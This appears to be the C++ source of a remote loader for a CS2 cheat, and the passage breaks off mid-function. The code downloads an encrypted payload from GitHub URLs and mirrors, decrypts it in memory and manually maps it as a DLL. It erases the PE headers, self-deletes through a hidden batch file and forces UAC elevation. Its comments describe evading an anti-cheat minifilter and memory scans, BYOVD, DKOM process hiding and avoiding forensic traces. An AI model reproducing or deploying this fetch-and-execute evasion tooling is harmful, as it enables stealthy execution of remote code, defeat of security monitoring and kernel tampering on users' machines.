// ============================================================
// loader.cpp �?远程加载 Stager
//
// 架构:
//   1. WinHTTP 从服务器下载加密 Payload
//   2. 内存�?XTEA+CBC 解密
//   3. 使用 ManualMapper 映射 DLL 到当前进�?
//   4. 调用 DllMain(DLL_PROCESS_ATTACH)
//   5. 自删除 (规避 minifilter 文件扫描)
//
// 磁盘上仅短暂存在 loader.exe 本身 (启动后立即自删除),
// Payload 全程在内存中, 不落盘�?
// ============================================================

#include <windows.h>
#include <wininet.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "psapi.lib")
#include <cstdint>
#include <cstdio>
#include <cstdarg>
#include <vector>
#include <string>

// ★ v3.296 FIX-25: NtQuerySystemInformation 声明 — 用于枚举 DKOM 隐藏的进程
//   原因: CreateToolhelp32Snapshot 用 ActiveProcessLinks 枚举进程,
//         DKOM self-loop (UnhideAll) 后进程不在链表中, Toolhelp 找不到.
//         NtQuerySystemInformation(SystemProcessInformation) 从 PspCidTable 枚举,
//         不依赖 ActiveProcessLinks, 能找到 DKOM 隐藏的进程.
extern "C" {
typedef LONG (WINAPI *NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);
}
#define SYSTEM_PROCESS_INFORMATION_CLASS 5

// UNICODE_STRING for ntdll structs (if not defined by subauth.h etc.)
typedef struct _UNICODE_STRING_FIX25 {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING_FIX25;

typedef struct _SYSTEM_PROCESS_INFORMATION_FIX25 {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER SpareLi1;
    LARGE_INTEGER SpareLi2;
    LARGE_INTEGER SpareLi3;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING_FIX25 ImageName;
    HANDLE UniqueProcessId;
    // ... 后续字段不需要
} SYSTEM_PROCESS_INFORMATION_FIX25;
// ★ BUILD 551: 移除 embedded_basic_loader.h — basic.exe 已在 BUILD 548 集成到 payload.dll
//   原因: embedded_basic_loader.h 在 BUILD 550 清理时被移到 obsolete_binaries,
//         但 loader.cpp 仍引用它,导致 loader.exe 编译失败 (当前 loader.exe 是旧版本)
//         旧 loader.exe 仍释放 basic_esp.exe 到 %TEMP%,被 PAC minifilter 扫描发现

// ============================================================
// ★ v3.38: loader 专用诊断日志 — 写 %TEMP%\loader_diag.log + FlushFileBuffers
//   用于定位 payload DllMain 之前的早期崩溃
// ============================================================
static void LoaderDiag(const char* fmt, ...) {
    char buf[512];
    va_list args;
    va_start(args, fmt);
    int len = vsnprintf(buf, sizeof(buf), fmt, args);
    if (len < 0) len = 0;
    if (len >= (int)sizeof(buf)) len = (int)sizeof(buf) - 1;
    va_end(args);
    wchar_t path[MAX_PATH];
    GetTempPathW(MAX_PATH, path);
    wcscat_s(path, L"loader_diag.log");
    HANDLE h = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(h, buf, (DWORD)len, &w, 0);
        FlushFileBuffers(h);
        CloseHandle(h);
    }
}

// ★ v3.38: 未处理异常过滤器 — 在 DllMain 之前崩溃时弹出诊断信息
static LONG WINAPI LoaderCrashHandler(PEXCEPTION_POINTERS ep) {
    DWORD code = ep->ExceptionRecord->ExceptionCode;
    uint64_t addr = (uint64_t)ep->ExceptionRecord->ExceptionAddress;

    LoaderDiag("LOADER-CRASH: code=0x%08X addr=0x%llX\n", code, addr);

    wchar_t msg[512];
    swprintf_s(msg, L"Loader.exe 崩溃\n\n"
                     L"异常代码: 0x%08X\n"
                     L"崩溃地址: 0x%llX\n\n"
                     L"诊断日志:\n"
                     L"  %%TEMP%%\\loader_diag.log\n"
                     L"  %%TEMP%%\\stealth_diag.log",
        code, addr);
    MessageBoxW(NULL, msg, L"Loader 崩溃诊断", MB_OK | MB_ICONERROR | MB_TOPMOST);
    return EXCEPTION_EXECUTE_HANDLER; // 终止进程
}

// ★ BUILD 558 FIX-3: VEH 处理器 — 捕获 DllMain 崩溃地址
//   问题: SetUnhandledExceptionFilter (UEH) 可能被 CRT 初始化覆盖, 或崩溃是 fast fail
//   解决: VEH 优先级高于 UEH, 能捕获更多异常类型 (包括 CRT 内部异常)
//   策略: 只记录 ACCESS_VIOLATION (0xC0000005), 避免干扰正常 SEH (如 _setjmp)
static void* g_payloadBase = nullptr;  // payload.dll 基址 (VEH 判断崩溃范围)
static size_t g_payloadSize = 0;
static LONG WINAPI LoaderVehHandler(PEXCEPTION_POINTERS ep) {
    DWORD code = ep->ExceptionRecord->ExceptionCode;
    // 只记录 ACCESS_VIOLATION, 避免干扰 CRT 正常 SEH
    if (code == 0xC0000005 /* ACCESS_VIOLATION */) {
        uint64_t addr = (uint64_t)ep->ExceptionRecord->ExceptionAddress;
        uint64_t base = (uint64_t)g_payloadBase;
        uint64_t end  = base + g_payloadSize;
        // 判断崩溃地址是否在 payload.dll 范围内
        const char* scope = "OUTSIDE";
        uint64_t offset = 0;
        if (base && addr >= base && addr < end) {
            scope = "INSIDE";
            offset = addr - base;
        }
        LoaderDiag("LOADER-VEH: AV addr=0x%llX [%s payload] offset=0x%llX base=0x%llX\n",
            addr, scope, offset, base);
    }
    return EXCEPTION_CONTINUE_SEARCH;  // 不处理, 让其他处理器处理
}

// v3.37: 确保管理员权限
// 首次运行时无 --elevated 标记 → 通过 ShellExecute runas 重新启动自身
// 重启后带 --elevated 标记 → 直接继续, 避免无限循环
static void EnsureAdminPrivileges() {
    // 检测命令行中是否已有 --elevated 标记 (防止无限重启动)
    LPWSTR cmdLine = GetCommandLineW();
    if (wcsstr(cmdLine, L"--elevated")) {
        return; // 已经是第二次启动, 直接继续
    }

    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb       = L"runas";
    sei.lpFile       = exePath;
    sei.lpParameters = L"--elevated";
    sei.nShow        = SW_SHOWNORMAL;

    if (ShellExecuteExW(&sei)) {
        ExitProcess(0);  // UAC 弹窗→用户同意→新管理员进程启动→旧进程退出
    }
    // 如果 ShellExecuteEx 失败 (UAC 禁用 / 已管理员),
    // 继续执行 — 由 payload.dll 内部的 BYOVD 进一步判断权限
}

// ============================================================
// 配置�?(部署时修�?
// ============================================================

// Payload 下载地址 — 从 GitHub 下载
// ★ v3.111: 针对中国网络环境 (raw.githubusercontent.com 常被 DNS 阻断),
//   添加 ghproxy.com 镜像作为备选 URL
static const wchar_t* PAYLOAD_URLS[] = {
    L"https://raw.githubusercontent.com/heruixii/cs2-remote-loader/main/payload.dat",
    L"https://ghproxy.net/https://raw.githubusercontent.com/heruixii/cs2-remote-loader/main/payload.dat",
    L"https://mirror.ghproxy.com/https://raw.githubusercontent.com/heruixii/cs2-remote-loader/main/payload.dat",
};
static const int PAYLOAD_URL_COUNT = sizeof(PAYLOAD_URLS) / sizeof(PAYLOAD_URLS[0]);

// 下载超时 (毫秒)
static const DWORD DOWNLOAD_TIMEOUT_MS = 30000;

// ============================================================
// ★ BUILD 551: XTEA 密钥分段混淆
//   原因: 原本 XTEA_KEY 以 constexpr 数组形式直接进入 .rdata 段,
//         PAC 内存扫描可直接匹配 16 字节明文密钥特征
//         (逆向确认 PAC 通过 MessageTransfer.sys minifilter 扫描进程内存)
//   策略:
//     1. 密钥拆分为 4 段, 每段与随机 mask 异或后存储 (XTEA_KEY_OBF)
//     2. mask 单独存储 (XTEA_KEY_MASK), 与 OBF 数组分开
//     3. 运行时通过 volatile 读取阻止 -O2 常量折叠, 在栈上 XOR 重组
//     4. noinline 阻止编译器把 GetXteaKey 内联到调用点 (避免优化器跨函数常量传播)
//     5. 解密完成后栈上密钥清零
//   收益: .rdata 段不再出现 XTEA_KEY 原始 16 字节明文,
//         即使 PAC 找到 OBF/MASK 数组也无法直接解密 payload.dat
// ============================================================

static constexpr uint32_t XTEA_DELTA = 0x9E3779B9;

// 真实密钥 (编译期推导, 不直接存储):
//   0x7B2E1A4F ^ 0x5A3C7E91 = 0x211264DE
//   0xC9D83560 ^ 0xF0E1D2C3 = 0x3939E7A3
//   0x4A1F93E7 ^ 0x1B2A3B4C = 0x5135A8AB
//   0xE8056B2C ^ 0x9F8E7D6C = 0x778B1640
static constexpr uint32_t XTEA_KEY_OBF[4] = {
    0x211264DE, 0x3939E7A3, 0x5135A8AB, 0x778B1640
};
static constexpr uint32_t XTEA_KEY_MASK[4] = {
    0x5A3C7E91, 0xF0E1D2C3, 0x1B2A3B4C, 0x9F8E7D6C
};

// ★ BUILD 551: 运行时密钥重组 (noinline + volatile 阻止常量折叠)
__attribute__((noinline)) static void GetXteaKey(uint32_t outKey[4]) {
    // volatile 强制编译器在运行时从内存读取, 阻止 -O2 把 XOR 在编译期折叠成明文
    volatile uint32_t obf0 = XTEA_KEY_OBF[0];
    volatile uint32_t obf1 = XTEA_KEY_OBF[1];
    volatile uint32_t obf2 = XTEA_KEY_OBF[2];
    volatile uint32_t obf3 = XTEA_KEY_OBF[3];
    volatile uint32_t mask0 = XTEA_KEY_MASK[0];
    volatile uint32_t mask1 = XTEA_KEY_MASK[1];
    volatile uint32_t mask2 = XTEA_KEY_MASK[2];
    volatile uint32_t mask3 = XTEA_KEY_MASK[3];

    outKey[0] = obf0 ^ mask0;
    outKey[1] = obf1 ^ mask1;
    outKey[2] = obf2 ^ mask2;
    outKey[3] = obf3 ^ mask3;
}

static void XteaDecryptBlock(uint32_t& v0, uint32_t& v1) {
    // ★ BUILD 551: 密钥从 GetXteaKey 动态获取, 不再使用 constexpr XTEA_KEY
    uint32_t key[4];
    GetXteaKey(key);
    uint32_t sum = 0xC6EF3720; // 32 * DELTA
    for (int i = 0; i < 32; i++) {
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum >> 11) & 3]);
        sum -= XTEA_DELTA;
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
    }
    // ★ BUILD 551: 解密完成后清零栈上密钥 (防止栈残留)
    key[0] = key[1] = key[2] = key[3] = 0;
}

static void XteaDecryptCBC(uint8_t* data, size_t size) {
    uint32_t iv0 = 0xDEADBEEF;
    uint32_t iv1 = 0xCAFEBABE;

    auto* blocks = reinterpret_cast<uint32_t*>(data);
    // ★ v3.69: XTEA 以 8 字节块为单位, 确保块数为偶数避免越界读取
    size_t numBlocks = (size / 4) & ~1ULL; // round down to even

    for (size_t i = 0; i < numBlocks; i += 2) {
        uint32_t saved0 = blocks[i];
        uint32_t saved1 = blocks[i+1];

        XteaDecryptBlock(blocks[i], blocks[i+1]);

        blocks[i]   ^= iv0;
        blocks[i+1] ^= iv1;

        iv0 = saved0;
        iv1 = saved1;
    }
}

// ============================================================
// HTTP 下载
// ============================================================

// ★ v3.111: 尝试一次 HTTP 下载 (指定 URL + 连接类型)
//   返回 true 表示下载成功, result 填充数据
static bool TryDownloadUrl(const wchar_t* url, DWORD openType, std::vector<uint8_t>& result) {
    result.clear();

    // 加随机查询参数 — 绕 GitHub CDN 缓存
    wchar_t cacheBustedUrl[512];
    swprintf_s(cacheBustedUrl, L"%ls?nocache=%u", url, GetTickCount());

    HINTERNET hInet = InternetOpenW(L"Mozilla/5.0", openType, nullptr, nullptr, 0);
    if (!hInet) {
        LoaderDiag("  TRY: InternetOpen(openType=%u) err=%u\n", openType, GetLastError());
        return false;
    }

    DWORD timeout = DOWNLOAD_TIMEOUT_MS;
    InternetSetOptionW(hInet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionW(hInet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionW(hInet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));

    HINTERNET hUrl = InternetOpenUrlW(hInet, cacheBustedUrl, nullptr, 0,
                                      INTERNET_FLAG_RELOAD |
                                      INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI, 0);
    if (!hUrl) {
        DWORD err = GetLastError();
        LoaderDiag("  TRY: InternetOpenUrl err=%u\n", err);
        InternetCloseHandle(hInet);
        return false;
    }

    // 检查 HTTP 状态码, 拒绝非 200 响应
    DWORD statusCode = 0;
    DWORD statusSize = sizeof(statusCode);
    if (HttpQueryInfoW(hUrl, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                       &statusCode, &statusSize, nullptr)) {
        LoaderDiag("  TRY: HTTP status=%u\n", statusCode);
        if (statusCode != 200) {
            LoaderDiag("  TRY: HTTP %u, skipping URL\n", statusCode);
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInet);
            return false;
        }
    }

    // 读取数据
    std::vector<uint8_t> buf(65536);
    DWORD bytesRead = 0;
    BOOL readOk = TRUE;
    while ((readOk = InternetReadFile(hUrl, buf.data(), 65536, &bytesRead)) && bytesRead > 0) {
        size_t oldSize = result.size();
        result.resize(oldSize + bytesRead);
        memcpy(result.data() + oldSize, buf.data(), bytesRead);
    }
    if (!readOk) {
        DWORD err = GetLastError();
        LoaderDiag("  TRY: InternetReadFile err=%u, partial=%zu\n", err, result.size());
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInet);
        result.clear();
        return false;
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInet);
    LoaderDiag("  TRY: OK (%zu bytes)\n", result.size());
    return true;
}

// ★ v3.129: 本地 payload.dat 优先 (开发迭代), HTTP 作为降级
// ★ v3.296: 移除本地优先逻辑 — 强制 HTTP 下载, 避免本地 payload.dat 残留被封禁风险
//   原因: payload.dat 虽加密, 但 loader.exe 自删后残留, 人工取证可发现
//   修改: 始终从 HTTP 下载, 本地有 payload.dat 也忽略
static std::vector<uint8_t> DownloadPayload() {
    // ★ v3.111: 多 URL + 多连接类型轮询下载
    static const DWORD openTypes[] = {
        INTERNET_OPEN_TYPE_DIRECT,
        INTERNET_OPEN_TYPE_PRECONFIG,
    };

    for (auto openType : openTypes) {
        for (int i = 0; i < PAYLOAD_URL_COUNT; i++) {
            LoaderDiag("  DL: openType=%u url[%d]\n", openType, i);
            std::vector<uint8_t> result;
            if (TryDownloadUrl(PAYLOAD_URLS[i], openType, result)) {
                LoaderDiag("  DL: HTTP SUCCESS (openType=%u url[%d])\n", openType, i);
                return result;
            }
        }
    }

    LoaderDiag("  DL: ALL FAILED\n");
    return {};
}

// ============================================================
// 自删�?�?启动批处理延迟删除自身文�?
// ============================================================

static void SelfDelete() {
    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(nullptr, selfPath, MAX_PATH);

    wchar_t batPath[MAX_PATH];
    GetTempPathW(MAX_PATH, batPath);
    wcscat_s(batPath, L"~cln.bat");

    // 写入自删除批处理
    HANDLE hBat = CreateFileW(batPath, GENERIC_WRITE, 0, nullptr,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
    if (hBat != INVALID_HANDLE_VALUE) {
        const char* batContent =
            "@echo off\r\n"
            ":retry\r\n"
            "del /f \"%~1\" 2>nul\r\n"
            "if exist \"%~1\" goto retry\r\n"
            "del /f \"%~0\" 2>nul\r\n";
        DWORD written;
        WriteFile(hBat, batContent, static_cast<DWORD>(strlen(batContent)),
                  &written, nullptr);
        CloseHandle(hBat);

        // ★ BUILD 471: CreateProcess + CREATE_NO_WINDOW — 真正无窗口自删
        //   ShellExecuteW(SW_HIDE) 在某些 Windows 版本仍会闪 cmd 窗口
        wchar_t cmdLine[512];
        swprintf_s(cmdLine, L"cmd.exe /c \"\"%s\" \"%s\"\"", batPath, selfPath);

        STARTUPINFOW si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {};

        if (CreateProcessW(nullptr, cmdLine, nullptr, nullptr, FALSE,
            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
}

// ============================================================
// 最小化 PE 手动映射�?(不依�?stealth_lib, 独立实现)
//
// 纯内存操�? download �?decrypt �?VirtualAlloc manual map
// 不写磁盘 — 规避 minifilter 文件系统监控
// VAD伪装交由 payload 端的 SelfCloaker 处理
// ============================================================

struct MinimalMapResult {
    bool     success;
    uint8_t* imageBase;
    size_t   imageSize;
    FARPROC  entryPoint;
};

#define SECTION_MAP_EXECUTE    0x0008
// 全程纯内存操�? download �?decrypt �?VirtualAlloc manual map
// VAD伪装交由 payload 端的 SelfCloaker 处理
// (已移除 SEC_IMAGE 磁盘路径 — 规避 minifilter)

static MinimalMapResult MinimalManualMap(const uint8_t* dllData, size_t dllSize) {
    MinimalMapResult result = {};

    // --- 1. 校验 PE 签名 ---
    if (dllSize < sizeof(IMAGE_DOS_HEADER)) return result;
    auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(dllData);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return result;

    auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(
        dllData + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return result;
    if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return result;

    DWORD imageSize = nt->OptionalHeader.SizeOfImage;
    uintptr_t preferredBase = nt->OptionalHeader.ImageBase;

    // --- 2. 纯内存 VirtualAlloc (无磁盘写入, 规避 minifilter) ---
    auto* imageBase = reinterpret_cast<uint8_t*>(
        VirtualAlloc(nullptr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!imageBase) return result;

    // --- 3. 复制 PE 头和区段 ---
    DWORD headerSize = nt->OptionalHeader.SizeOfHeaders;
    memcpy(imageBase, dllData, headerSize);

    auto* firstSection = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (firstSection[i].SizeOfRawData > 0) {
            memcpy(imageBase + firstSection[i].VirtualAddress,
                   dllData + firstSection[i].PointerToRawData,
                   firstSection[i].SizeOfRawData);
        }
    }

    // --- 4. 基址重定�?---
    uintptr_t delta = reinterpret_cast<uintptr_t>(imageBase) - preferredBase;
    if (delta != 0) {
        auto& relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.VirtualAddress && relocDir.Size) {
            auto* reloc = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(
                imageBase + relocDir.VirtualAddress);
            auto* relocEnd = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(
                imageBase + relocDir.VirtualAddress + relocDir.Size);

            while (reloc < relocEnd && reloc->SizeOfBlock) {
                DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                auto* entries = reinterpret_cast<const WORD*>(reloc + 1);
                for (DWORD j = 0; j < count; j++) {
                    if ((entries[j] >> 12) == IMAGE_REL_BASED_DIR64) {
                        auto* patch = reinterpret_cast<uintptr_t*>(
                            imageBase + reloc->VirtualAddress + (entries[j] & 0xFFF));
                        *patch += delta;
                    }
                }
                reloc = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(
                    reinterpret_cast<const uint8_t*>(reloc) + reloc->SizeOfBlock);
            }
        }
    }

    // --- 5. 导入表解�?(预加载loader目录下的 pthread DLL) ---
    wchar_t loaderDir[MAX_PATH];
    GetModuleFileNameW(nullptr, loaderDir, MAX_PATH);
    wchar_t* lastSlash = wcsrchr(loaderDir, L'\\');
    if (lastSlash) *(lastSlash + 1) = L'\0';

    static const wchar_t* preloadDlls[] = { L"libwinpthread-1.dll" };
    for (const auto* dll : preloadDlls) {
        wchar_t fullPath[MAX_PATH];
        wcscpy_s(fullPath, loaderDir);
        wcscat_s(fullPath, dll);
        if (!LoadLibraryW(fullPath)) {
            LoadLibraryW(dll);
        }
    }

    auto& importDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.VirtualAddress && importDir.Size) {
        auto* importDesc = reinterpret_cast<const IMAGE_IMPORT_DESCRIPTOR*>(
            imageBase + importDir.VirtualAddress);

        // ★ BUILD 558 FIX-3: IAT NULL 条目统计 (检测 GetProcAddress 失败)
        int iatNullCount = 0;
        int iatTotalCount = 0;

        for (int i = 0; importDesc[i].Name; i++) {
            auto dllName = reinterpret_cast<const char*>(
                imageBase + importDesc[i].Name);
            HMODULE hMod = LoadLibraryA(dllName);
            if (!hMod) hMod = GetModuleHandleA(dllName);
            if (!hMod) {
                LoaderDiag("  IAT: FAIL LoadLibrary %s — skipping (IAT will have NULLs)\n", dllName);
                continue;
            }

            auto* thunk = reinterpret_cast<uintptr_t*>(
                imageBase + importDesc[i].FirstThunk);
            auto* origThunk = reinterpret_cast<uintptr_t*>(
                imageBase + (importDesc[i].OriginalFirstThunk
                    ? importDesc[i].OriginalFirstThunk
                    : importDesc[i].FirstThunk));

            for (int j = 0; origThunk[j]; j++) {
                iatTotalCount++;
                if (origThunk[j] & IMAGE_ORDINAL_FLAG64) {
                    thunk[j] = reinterpret_cast<uintptr_t>(
                        GetProcAddress(hMod, MAKEINTRESOURCEA(
                            origThunk[j] & 0xFFFF)));
                } else {
                    auto* importByName = reinterpret_cast<const IMAGE_IMPORT_BY_NAME*>(
                        imageBase + origThunk[j]);
                    thunk[j] = reinterpret_cast<uintptr_t>(
                        GetProcAddress(hMod, importByName->Name));
                }
                // ★ BUILD 558 FIX-3: 检测 NULL IAT 条目 (GetProcAddress 失败)
                if (thunk[j] == 0) {
                    iatNullCount++;
                    const char* funcName = "<ordinal>";
                    if (!(origThunk[j] & IMAGE_ORDINAL_FLAG64)) {
                        funcName = reinterpret_cast<const IMAGE_IMPORT_BY_NAME*>(
                            imageBase + origThunk[j])->Name;
                    }
                    LoaderDiag("  IAT NULL: dll=%s func=%s (GetProcAddress failed)\n",
                        dllName, funcName);
                }
            }
        }
        LoaderDiag("  IAT verify: %d/%d entries NULL (DLL=%s)\n",
            iatNullCount, iatTotalCount,
            iatNullCount > 0 ? "WILL CRASH" : "OK");
    }

    // --- 6. 设置区段保护 ---
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD prot = PAGE_READWRITE;
        DWORD ch = firstSection[i].Characteristics;
        if (ch & IMAGE_SCN_MEM_EXECUTE)
            prot = (ch & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        else if (!(ch & IMAGE_SCN_MEM_WRITE))
            prot = PAGE_READONLY;
        if (firstSection[i].Misc.VirtualSize > 0) {
            DWORD oldProt;
            VirtualProtect(imageBase + firstSection[i].VirtualAddress,
                           firstSection[i].Misc.VirtualSize, prot, &oldProt);
        }
    }

    auto entryRVA = nt->OptionalHeader.AddressOfEntryPoint;

    // ★ BUILD 551: 擦除 PE 头 (DOS header / PE signature / NT headers / Section headers)
    //   原因: ManualMap 后 payload.dll 的 PE 头 ("MZ" / "PE\0\0" / "This program cannot
    //         be run in DOS mode") 残留在 loader.exe 内存中,被 PAC 内存扫描发现
    //   策略: 用随机字节覆盖前 SizeOfHeaders 字节 (典型 0x400,覆盖所有 PE 头结构)
    //         保留区段保护已设置,入口点已计算
    //   安全性: payload.dll 不依赖自身 PE 头 (不调用 GetModuleHandleW(NULL) 解析自身,
    //           不通过 GetProcAddress 查找自身导出,无 TLS 回调,无 RtlAddFunctionTable)
    {
        DWORD headerSize = nt->OptionalHeader.SizeOfHeaders;
        DWORD eraseSize = (headerSize > 0 && headerSize <= 0x1000) ? headerSize : 0x400;
        DWORD oldProt;
        if (VirtualProtect(imageBase, eraseSize, PAGE_READWRITE, &oldProt)) {
            // 用伪随机字节覆盖 (零填充易被识别为"擦除痕迹",随机更隐蔽)
            // 简单 LCG 随机数生成器 (不依赖 CRT rand,避免初始化问题)
            uint32_t rngState = 0x6D5A9A3B ^ GetTickCount() ^ GetCurrentProcessId();
            for (DWORD i = 0; i < eraseSize; i++) {
                rngState = rngState * 1103515245u + 12345u;
                imageBase[i] = (uint8_t)((rngState >> 16) & 0xFF);
            }
            VirtualProtect(imageBase, eraseSize, PAGE_READONLY, &oldProt);
        }
    }

    result.success = true;
    result.imageBase = imageBase;
    result.imageSize = imageSize;
    result.entryPoint = reinterpret_cast<FARPROC>(imageBase + entryRVA);
    return result;
}

// ============================================================
// 主入�?(WinMain �?无控制台窗口)
// ============================================================

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // ★ v3.38: 最早注册未处理异常处理器 (在 DllMain 之前, 捕获 loader 本体崩溃)
    SetUnhandledExceptionFilter(LoaderCrashHandler);
    // ★ BUILD 558 FIX-3: VEH 优先级高于 UEH, 捕获 DllMain 早期崩溃 (含 CRT 内部异常)
    //   UEH 在前几次测试中未触发 (sd.log 不存在, 也无 LOADER-CRASH 日志),
    //   怀疑 CRT 初始化覆盖了 UEH, 或崩溃走 fast-fail 路径绕过 UEH.
    //   VEH 在 KiUserExceptionDispatcher 流程中先于 UEH 调用, 能捕获更多异常类型.
    AddVectoredExceptionHandler(0 /*最后调用, 不阻塞 SEH/VEH 链*/, LoaderVehHandler);
    LoaderDiag("=== LOADER v3.296 FIX-21 START (BUILD 567: infinite Sleep + old loader cleanup) ===\n");

    // ★ v3.296 FIX-21/FIX-25: 清理旧 loader.exe 进程 (CS2 退出后旧 loader 进入无限 Sleep)
    //   原因: v3.296 FIX-21 策略 — CS2 退出后旧 loader 不退出 (无限 Sleep, 避免 PspExitProcess 蓝屏).
    //         新 loader 启动时必须清理旧进程, 否则多个 loader 实例冲突.
    //   安全性: 旧 loader 在 Sleep 中, 不访问内核资源, TerminateProcess 安全.
    //           旧 loader 的 VAD 已恢复 (FIX-22), PspExitProcess 不会蓝屏.
    //           旧 loader 的 driver 句柄已关闭 (kma.Shutdown), 无内核回调风险.
    //   ★ FIX-25: DKOM self-loop (UnhideAll) 后进程不在 ActiveProcessLinks 链表中,
    //     CreateToolhelp32Snapshot 找不到. 改用 NtQuerySystemInformation (PspCidTable)
    //     枚举所有进程, 包括 DKOM 隐藏的.
    {
        DWORD currentPid = GetCurrentProcessId();
        wchar_t exeName[MAX_PATH] = {};
        GetModuleFileNameW(NULL, exeName, MAX_PATH);
        wchar_t* baseName = wcsrchr(exeName, L'\\');
        const wchar_t* loaderName = baseName ? baseName + 1 : exeName;
        LoaderDiag("FIX25: current loader name='%ls' pid=%u\n", loaderName, currentPid);

        // 方法 1: CreateToolhelp32Snapshot (走 ActiveProcessLinks, 找不到 DKOM 隐藏进程)
        int killedByToolhelp = 0;
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = {};
            pe.dwSize = sizeof(pe);
            if (Process32FirstW(snap, &pe)) {
                do {
                    if (pe.th32ProcessID == currentPid) continue;
                    if (_wcsicmp(pe.szExeFile, loaderName) == 0) {
                        HANDLE hOld = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                        if (hOld) {
                            if (TerminateProcess(hOld, 0)) {
                                LoaderDiag("FIX21: killed old loader pid=%u (Toolhelp)\n", pe.th32ProcessID);
                                killedByToolhelp++;
                            }
                            CloseHandle(hOld);
                        }
                    }
                } while (Process32NextW(snap, &pe));
            }
            CloseHandle(snap);
        }

        // 方法 2: NtQuerySystemInformation (走 PspCidTable, 找得到 DKOM 隐藏进程)
        //   当 Toolhelp 找不到时, 用此方法清理 DKOM 隐藏的旧 loader
        if (killedByToolhelp == 0) {
            HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
            if (hNtdll) {
                auto pNtQSI = (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");
                if (pNtQSI) {
                    // 先查询所需缓冲区大小
                    ULONG bufSize = 0;
                    pNtQSI(SYSTEM_PROCESS_INFORMATION_CLASS, NULL, 0, &bufSize);
                    if (bufSize == 0) bufSize = 0x100000;  // 兜底 1MB
                    std::vector<uint8_t> buf(bufSize);
                    ULONG retLen = 0;
                    LONG status = pNtQSI(SYSTEM_PROCESS_INFORMATION_CLASS, buf.data(), (ULONG)buf.size(), &retLen);
                    if (status == 0 && retLen > 0) {
                        // 遍历 SYSTEM_PROCESS_INFORMATION 链表
                        uint8_t* p = buf.data();
                        int killedByNtQSI = 0;
                        while (p < buf.data() + retLen) {
                            auto* spi = (SYSTEM_PROCESS_INFORMATION_FIX25*)p;
                            HANDLE pid = spi->UniqueProcessId;
                            // 跳过 System (pid=4) 和 Idle (pid=0) 和自己
                            if (pid != (HANDLE)0 && pid != (HANDLE)4 &&
                                pid != (HANDLE)currentPid && pid != (HANDLE)-1) {
                                DWORD pid32 = (DWORD)(ULONG_PTR)pid;
                                // 验证进程名: 用 OpenProcess + GetModuleFileNameExW
                                //   (NtQSI 的 ImageName 可能为空, 用 psapi 验证更可靠)
                                HANDLE hOld = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_TERMINATE, FALSE, pid32);
                                if (hOld) {
                                    wchar_t procPath[MAX_PATH] = {};
                                    DWORD pathLen = GetModuleFileNameExW(hOld, NULL, procPath, MAX_PATH);
                                    if (pathLen > 0) {
                                        wchar_t* pName = wcsrchr(procPath, L'\\');
                                        const wchar_t* pBase = pName ? pName + 1 : procPath;
                                        if (_wcsicmp(pBase, loaderName) == 0) {
                                            if (TerminateProcess(hOld, 0)) {
